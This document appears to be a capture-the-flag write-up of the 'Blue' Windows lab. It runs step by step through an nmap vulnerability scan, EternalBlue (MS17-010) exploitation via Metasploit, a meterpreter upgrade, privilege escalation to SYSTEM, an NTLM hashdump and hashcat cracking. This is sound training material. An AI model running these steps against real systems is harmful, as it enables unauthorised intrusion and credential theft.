# recon
```console
kali@kali:~/blue$ nmap -sV -vv --script vuln 10.10.184.211
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-28 18:01 EDT
NSE: Loaded 149 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 18:01
Completed NSE at 18:01, 10.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 18:01
Completed NSE at 18:01, 0.00s elapsed
Initiating Ping Scan at 18:01
Scanning 10.10.184.211 [2 ports]
Completed Ping Scan at 18:01, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:01
Completed Parallel DNS resolution of 1 host. at 18:01, 0.04s elapsed
Initiating Connect Scan at 18:01
Scanning 10.10.184.211 [1000 ports]
Discovered open port 445/tcp on 10.10.184.211
Discovered open port 139/tcp on 10.10.184.211
Discovered open port 3389/tcp on 10.10.184.211
Discovered open port 135/tcp on 10.10.184.211
Discovered open port 49160/tcp on 10.10.184.211
Discovered open port 49158/tcp on 10.10.184.211
Discovered open port 49152/tcp on 10.10.184.211
Discovered open port 49153/tcp on 10.10.184.211
Discovered open port 49154/tcp on 10.10.184.211
Completed Connect Scan at 18:01, 0.75s elapsed (1000 total ports)
Initiating Service scan at 18:01
Scanning 9 services on 10.10.184.211
Service scan Timing: About 55.56% done; ETC: 18:03 (0:00:44 remaining)
Completed Service scan at 18:02, 59.50s elapsed (9 services on 1 host)
NSE: Script scanning 10.10.184.211.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 18:02
NSE: [firewall-bypass 10.10.184.211] lacks privileges.
Completed NSE at 18:03, 30.04s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 18:03
NSE: [tls-ticketbleed 10.10.184.211:3389] Not running due to lack of privileges.
Completed NSE at 18:03, 0.29s elapsed
Nmap scan report for 10.10.184.211
Host is up, received conn-refused (0.045s latency).
Scanned at 2020-05-28 18:01:54 EDT for 90s
Not shown: 991 closed ports
Reason: 991 conn-refused
PORT      STATE SERVICE            REASON  VERSION
135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp   open  microsoft-ds       syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
3389/tcp  open  ssl/ms-wbt-server? syn-ack
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| rdp-vuln-ms12-020: 
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|   
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|_sslv2-drown: 
49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49153/tcp open  msrpc              syn-ack Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49154/tcp open  msrpc              syn-ack Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49158/tcp open  msrpc              syn-ack Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49160/tcp open  msrpc              syn-ack Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 18:03
Completed NSE at 18:03, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 18:03
Completed NSE at 18:03, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.25 seconds
```
Bingo ! the target is vulerable to ms17-010, Remote Code Execution vulnerability in Microsoft SMBv1 server.


# gain access
```console
kali@kali:~/blue$ msfconsole # fire metasploit
msf5$ search SMBv1 # search for vuln
Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  auxiliary/scanner/smb/smb1                                 normal   No     SMBv1 Protocol Detection
   1  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
msf5$ use 1 # use the exploit
msf5$ show options # show all options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS <target ip> # aim 
RHOSTS => XX.XX.XXX.X
msf5 exploit(windows/smb/ms17_010_eternalblue) > run # headshot
```

# Escalate
Yes we are in, now let Background this session and jump back to ```msf```, we need ```meterpretter```. After some digging I found this [link](https://null-byte.wonderhowto.com/how-to/upgrade-normal-command-shell-metasploit-meterpreter-0166013/), check **Step2**
```cmd
C:\Windows\system32>^Z
Background session 1? [y/N]
```
back to msf
```console
msf5$ exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter # search for module 

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


msf5$ exploit(windows/smb/ms17_010_eternalblue) > use 0 # use it
msf5$ post(multi/manage/shell_to_meterpreter) > show options # check all options, incase we need to set up something. Make sure the requried options are filled

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.

msf5$ post(multi/manage/shell_to_meterpreter) > sessions # SESSION is empty need to fill it up -> reun sessions/sessions -l to check it

Active sessions
===============

  Id  Name  Type               Information                                                                       Connection
  --  ----  ----               -----------                                                                       ----------
  1         shell x64/windows  Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.8.14.151:4444 -> 10.10.184.211:49198 (10.10.184.211)
msf5$ post(multi/manage/shell_to_meterpreter) > set SESSION 1 # set SESSION to 1 which is the session between us and the target.
SESSION => 1
msf5$ post(multi/manage/shell_to_meterpreter) > run # fire it
msf5$ post(multi/manage/shell_to_meterpreter) > sessions # check all sessions again

Active sessions
===============

  Id  Name  Type                     Information                                                                       Connection
  --  ----  ----                     -----------                                                                       ----------
  1         shell x64/windows        Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.8.14.151:4444 -> 10.10.184.211:49198 (10.10.184.211)
  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ JON-PC                                                      10.8.14.151:4433 -> 10.10.184.211:49218 (10.10.184.211)
```
You can see that we got another session, ```SESSION 2``` wich is a ```meterpreter``` type. new connect to session and HUNT!!


NOTE: if dosent work when u run/exploit, try completing the exploit from the previous task (gain access) once more.
```console
msf5$ post(multi/manage/shell_to_meterpreter) > sessions -i 2 # connect to session 2
[*] Starting interaction with 2...

meterpreter$ > getsystem # check system privilage
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter$ > shell # access shell
```
```cmd
Process 1232 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
**we have escalated to NT AUTHORITY\SYSTEM.**


We now have the system level privileages. Next step it migrate to a process that have system level privileages. run ```ps``` and look for ```NT AUTHORITY\SYSTEM``` user. A candidates are ```powershell``` and ```cmd``` or programs such as ```word``` that may have been left **running on this system**. Check for
```console
meterpreter$ > ps # list all processes
meterpreter$ > migrate 2880 # migrate to the system level privileages process
[*] Migrating from 2172 to 2880...
[*] Migration completed successfully.
```
if the migate failed, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time. 

# Cracking
now dump the hashed passwords using ```hashdump```
```console
meterpreter$ > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```
Each field is separated with colon. The fields are:
1. 1stfield: username(Administrator, User1, etc.)
2. 2ndfield: Relative Identification (RID):last 3-4 digits of the Security Identifier (SID), which are unique to each user
3. 3rdfield: LM hash
4. 4thfield: NTLM hash


Window password is hash with **Windows NT hashes** (-m 1000 in hashcat). Now run hashcat to crack them all!!
```console
kali@kali:~/blue$ nano hash.txt # put all hashed inside
kali@kali:~/blue$ hashcat -m 1000 -a 0 -o blue.txt hash.txt /usr/share/wordlists/rockyou.txt  --force
```
# flag
Try to have fun and try to find it by yourself!!

HINT:
* flag1: C
* flag2: config
* flag3: Jon